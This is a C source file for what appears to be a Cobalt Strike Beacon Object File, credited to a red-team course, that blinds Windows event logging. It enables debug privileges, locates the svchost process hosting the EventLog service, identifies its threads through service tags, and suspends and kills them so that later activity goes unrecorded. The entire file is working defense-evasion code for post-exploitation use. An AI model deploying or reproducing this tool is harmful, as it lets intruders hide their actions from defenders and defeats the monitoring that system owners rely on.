/*

 Credits: 
 - reenz0h (twitter: @SEKTOR7net) - Red Team Operator course code template Blinding Eventlog
 - Alex Ionescu, NSA, Wen Jia Liu, Halil Dalabasmaz
*/

/**
 * Load custom header files.
 */
#include <windows.h>  
#include <Strsafe.h>
#include <stdio.h>
#include <tlhelp32.h>
#include ".\evasion\eva-blindingeventlog-bof-structs.h"
#include ".\evasion\eva-blindingeventlog-bof-imports.h"
#include "..\beacon.h"
#include "..\bofdefs.h"

#pragma comment(lib,"Advapi32.lib")
#pragma comment(lib,"shell32.lib")

#define ENABLE 1
#define DISABLE 0


BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
	HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

	if (!ADVAPI32$OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		BeaconPrintf(CALLBACK_OUTPUT, "[*] OpenProcessToken() failed!\n");
		return FALSE;
	}

    if (!ADVAPI32$LookupPrivilegeValueA( 
            NULL,            // lookup privilege on local system
            lpszPrivilege,   // privilege to lookup 
            &luid ) )        // receives LUID of privilege
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] LookupPrivilegeValue error: %u\n", GetLastError()); 
        return FALSE; 
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    if ( !ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL) ) { 
          BeaconPrintf(CALLBACK_OUTPUT,"[*] AdjustTokenPrivileges error: %u\n", KERNEL32$GetLastError() ); 
          return FALSE;
    } 

    if ( KERNEL32$GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
          BeaconPrintf(CALLBACK_OUTPUT,"[*] The token does not have the specified privilege.\n");
          return FALSE;
    }
    return TRUE;
}

// Usage: eva-blindingeventlog (no args)
void go(char *args, int alen) {
	SERVICE_STATUS_PROCESS svcStatus = {0};
	DWORD bytesNeeded = 0;
	HANDLE hSvcProc = NULL;
	HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
	THREADENTRY32 te32;
	THREAD_BASIC_INFORMATION threadBasicInfo;
	PVOID subProcessTag = NULL;
	BOOL bIsWoW64 = FALSE;
	DWORD dwOffset = NULL;
	
	
	// get function pointers
	NtQueryInformationThread_t pNtQueryInformationThread = (NtQueryInformationThread_t) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("ntdll.dll"), "NtQueryInformationThread");
	I_QueryTagInformation_t pI_QueryTagInformation = (I_QueryTagInformation_t) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("advapi32.dll"), "I_QueryTagInformation");
	
	
	if (!SetPrivilege(SE_DEBUG_NAME, ENABLE)) {
		BeaconPrintf(CALLBACK_OUTPUT,"Boooo! No powers, we die!\n");
		return;
	}
	
	// talk to Service Manager to find Eventlog process
	SC_HANDLE sc = ADVAPI32$OpenSCManagerA(".", NULL, MAXIMUM_ALLOWED);
	SC_HANDLE svc = ADVAPI32$OpenServiceA(sc, "EventLog", MAXIMUM_ALLOWED);
	
	//Get PID of svchost.exe that hosts EventLog service
	ADVAPI32$QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE) &svcStatus, sizeof(svcStatus), &bytesNeeded);
	DWORD svcPID = svcStatus.dwProcessId;
	
	BeaconPrintf(CALLBACK_OUTPUT,"[+] Target -> Svchost with eventlog - PID: %d\n", svcPID);

	// open svchost.exe containing Eventlog
	hSvcProc = KERNEL32$OpenProcess(PROCESS_VM_READ, FALSE, svcPID);
	if (hSvcProc == NULL){
		BeaconPrintf(CALLBACK_OUTPUT,"[*] Unable to open the target process...\n");
		return;
	}

	// get snapshot of all threads
	hThreadSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap == INVALID_HANDLE_VALUE){
		BeaconPrintf(CALLBACK_OUTPUT,"[*] Unable to create processes snapshot...\n");
		return;
	}
	te32.dwSize = sizeof(THREADENTRY32);
	
	// parse the snapshot and search for threads belonging to eventlog
	if (!KERNEL32$Thread32First(hThreadSnap, &te32)) {
		BeaconPrintf(CALLBACK_OUTPUT,"[*] Thread32First() and we died\n");
		CloseHandle(hThreadSnap);
		return;
	}
	
	do {
		// found the one from svchost.exe containing Eventlog
		if (te32.th32OwnerProcessID == svcPID) {
			// now searching for subProcessTag assigned to Eventlog
			HANDLE hThread =  KERNEL32$OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
			
			if (hThread == NULL) {
				BeaconPrintf(CALLBACK_OUTPUT, "OpenThread : %u Error! ErrorCode:%u\n", te32.th32ThreadID,  KERNEL32$GetLastError());
				return;
			}
			NTSTATUS status = pNtQueryInformationThread(hThread, (THREAD_INFORMATION_CLASS) 0, &threadBasicInfo, sizeof(threadBasicInfo), NULL);
			
			// check if svchost.exe is 32- or 64-bit, offset in TEB is different for each arch
			bIsWoW64 =  KERNEL32$IsWow64Process(hSvcProc, &bIsWoW64);
			if (!bIsWoW64)
				dwOffset = 0x1720;
			else
				dwOffset = 0xf60;
			
			// read subProcessTag value from TEB of svchost.exe
			KERNEL32$ReadProcessMemory(hSvcProc, ((PBYTE)threadBasicInfo.pTebBaseAddress + dwOffset), &subProcessTag, sizeof(subProcessTag), NULL);

			if (!subProcessTag) {
				KERNEL32$CloseHandle(hThread);
				continue;
			}

			SC_SERVICE_TAG_QUERY query = { 0 };
			
			// Check the tag information of the thread, if its 'query.pBuffer' is called "eventlog" then that is one of the threads used to capture the events to be displayed.
			if (pI_QueryTagInformation)	{
				query.processId = (ULONG) svcPID;
				query.serviceTag = (ULONG) subProcessTag;
				query.reserved = 0;
				query.pBuffer = NULL;
				
				pI_QueryTagInformation(NULL, ServiceNameFromTagInformation, &query);
				
				if (_wcsicmp((wchar_t *) query.pBuffer, L"eventlog") == 0) {
					BeaconPrintf(CALLBACK_OUTPUT,"[!] Eventlog thread FOUND: %d. Suspending...", te32.th32ThreadID);
					if ( KERNEL32$SuspendThread(hThread) != -1)
					BeaconPrintf(CALLBACK_OUTPUT, "[!] Eventlog thread FOUND: %d. Killing...", te32.th32ThreadID);
					if ( KERNEL32$TerminateThread(hThread, NULL))
						BeaconPrintf(CALLBACK_OUTPUT,"[+] Done!\n");
					else
						BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed!\n");
				}
			}
			KERNEL32$CloseHandle(hThread);
		}
	} while (KERNEL32$Thread32Next(hThreadSnap, &te32));

	KERNEL32$CloseHandle(hThreadSnap);
	KERNEL32$CloseHandle(hSvcProc);
    return;
}
